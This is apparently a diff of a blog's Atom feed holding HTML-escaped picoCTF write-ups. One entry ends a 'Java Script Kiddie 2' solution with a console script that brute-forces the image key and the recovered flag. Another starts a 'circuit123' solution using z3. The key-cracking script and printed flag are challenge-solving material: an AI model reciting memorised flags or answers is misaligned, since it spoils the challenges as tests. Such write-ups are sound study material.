+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;assemble_png&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(u_in){
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LEN &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;key &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;00000000000000000000000000000000&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;shifter;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(u_in.length &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;key.length){
+        key &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;u_in;
+    }
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;result &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;[];
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;; i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LEN&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;; i&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;){
+        shifter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;Number&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(key.slice((i&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;),(i&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;));
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;; j &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(bytes.length &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LEN&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;); j &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;){
+            result[(j &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LEN&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;i] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;bytes[(((j &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;shifter) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LEN&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;bytes.length) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;i]
+        }
+    }
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;while&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(result[result.length&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;){
+        result &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;result.slice(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,result.length&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    }
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;.getElementById(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Area&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;).src &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;data:image&#x2F;png;base64,&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;btoa(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;fromCharCode&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;.apply(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;null&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;Uint8Array&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(result)));
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
+&lt;p&gt;Based on testing, the &lt;code&gt;document.getElementById(&amp;quot;Area&amp;quot;).src&lt;&#x2F;code&gt; will only change by 1 or 2 characters based on the input key, 
+and it only affects the output in matching positions. That is, a key starting with &lt;code&gt;5871&lt;&#x2F;code&gt; will always start with 
+&lt;code&gt;data:image&#x2F;png;base64,iV&lt;&#x2F;code&gt;. Base64 encoded pngs always start with the following header 
+&lt;code&gt;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEU&lt;&#x2F;code&gt;. Therefore, we can easily bruteforce this. I used the following script 
+(by pasting into Chrome DevTools Console). However, because this script only expects a change in &lt;code&gt;src&lt;&#x2F;code&gt; by a single 
+character for every two input digits, this occasionally requires manual intervention by updating &lt;code&gt;cur_known&lt;&#x2F;code&gt; and 
+&lt;code&gt;cur_expected&lt;&#x2F;code&gt;, preventing a raw bruteforce.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;expected_final &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEU&amp;#39;
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;let cur_known = &amp;#39;&amp;#39;
+&#x2F;&#x2F;let cur_expected = &amp;#39;data:image&#x2F;png;base64,i&amp;#39;
+
+&#x2F;&#x2F;let cur_known = &amp;#39;50706000107050002115&amp;#39;
+&#x2F;&#x2F;let cur_expected = &amp;#39;data:image&#x2F;png;base64,iVBORw0KGgoA&amp;#39;
+
+&#x2F;&#x2F;let cur_known = &amp;#39;507060001070500060100090&amp;#39;
+&#x2F;&#x2F;let cur_expected = &amp;#39;data:image&#x2F;png;base64,iVBORw0KGgoAAAANS&amp;#39;
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;cur_known &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;507060001070500060100090300706&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;cur_expected &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEU&amp;#39;
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ignored &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;Set&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;()
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(cur_known.length &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;){
+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;found &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#795da3;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(cur_known)
+	
+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;cur;
+	
+	outer:
+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;; j &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;; j&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+		&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;; i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;; i&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+			cur &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;cur_known &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;i;
+			
+			&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ignored.has(cur)){
+				assemble_png(cur.padEnd(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)); 
+				
+				&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;.getElementById(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Area&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;).src.startsWith(cur_expected)) {
+					found &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+					&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;outer;
+				}
+			}
+		}
+	}
+	
+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;found){
+		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#795da3;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Backtracking&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, cur_known, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;.getElementById(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Area&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;).src, cur_expected)
+		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; Ignore current string
+		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ignored.add(cur_known)
+		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#795da3;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(ignored)
+		
+		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; Backtrack - last one was wrong
+		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;cur_known &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;cur_known.substring(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, cur_known.length &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+
+		cur_expected &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;cur_expected.substring(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, cur_expected.length &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+	}
+	
+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(found){
+		&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(cur_expected &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;expected_final){
+			alert(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Found&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+			&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+		}
+		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#795da3;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Found&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, cur, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;.getElementById(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Area&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;).src, cur_expected)
+		cur_known &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;cur;
+		
+		cur_expected &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;expected_final.substr(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, cur_expected.length &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+	}
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;After running this script, we are able to see the decoded image:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;picoctf-2019-java-script-kiddie-2&#x2F;5da2582c0ac7cd093dc392d5.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Decoding the QR code gives us the flag:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;picoCTF{b19be0d3b70ffc63b6367ecf136e853e}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>picoCTF 2018 - circuit123</title>
+		<published>2018-10-17T02:23:29.709+00:00</published>
+		<updated>2018-10-17T02:29:08.242+00:00</updated>
+		<link href="/posts/picoctf-2018-circuit123/" type="text/html"/>
+		<id>/posts/picoctf-2018-circuit123/</id>
+		<content type="html">&lt;h1 id=&quot;problem&quot;&gt;Problem&lt;&#x2F;h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Can you crack the key to &lt;a href=&quot;https:&#x2F;&#x2F;2018shell2.picoctf.com&#x2F;static&#x2F;27ebc8a7ba2202cfcba1471080e05e2c&#x2F;decrypt.py&quot;&gt;decrypt&lt;&#x2F;a&gt; 
+&lt;a href=&quot;https:&#x2F;&#x2F;2018shell2.picoctf.com&#x2F;static&#x2F;27ebc8a7ba2202cfcba1471080e05e2c&#x2F;map2.txt&quot;&gt;map2&lt;&#x2F;a&gt; for us? The key to 
+&lt;a href=&quot;https:&#x2F;&#x2F;2018shell2.picoctf.com&#x2F;static&#x2F;27ebc8a7ba2202cfcba1471080e05e2c&#x2F;map1.txt&quot;&gt;map1&lt;&#x2F;a&gt; is 11443513758266689915.&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;h2 id=&quot;hint&quot;&gt;Hint&lt;&#x2F;h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;z3&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;h1 id=&quot;solution&quot;&gt;Solution&lt;&#x2F;h1&gt;
+&lt;p&gt;Given the problem and the hint, it is clear that we can use z3 to solve this problem. We can
+create a z3 &lt;code&gt;BitVec&lt;&#x2F;code&gt; and pass it into the verify function to avoid writing a custom decrypter. Because we don&#x27;t know the 
+length of the bit vector, I used a conservative estimate of &lt;code&gt;128&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
